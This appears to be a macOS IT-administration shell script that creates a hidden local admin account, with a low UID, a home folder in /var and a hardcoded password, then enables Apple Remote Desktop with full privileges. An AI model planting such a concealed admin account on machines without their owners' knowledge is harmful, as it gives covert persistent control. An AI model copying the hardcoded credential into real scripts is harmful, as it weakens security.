#!/bin/sh

# Create user record in directory services
dscl . -create /Users/administrator
dscl . -create /Users/administrator RealName "Administrator"
dscl . -create /Users/administrator UniqueID 407  # Use something between 100 and 500 to hide the user
dscl . -create /Users/administrator PrimaryGroupID 20
dscl . -create /Users/administrator UserShell /bin/bash
dscl . -passwd /Users/administrator "Sh0wt1me"  # Obviously, use something else here

# Set up a hidden home folder
dscl . -create /Users/administrator NFSHomeDirectory /var/administrator  # or other hidden location
cp -R /System/Library/User\ Template/English.lproj /var/administrator
chown -R administrator:staff /var/administrator

# Grant admin & ARD rights
dseditgroup -o edit -a administrator -t user admin
/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users administrator,daladmin,admin,casperscreensharing -privs -all -restart -agent


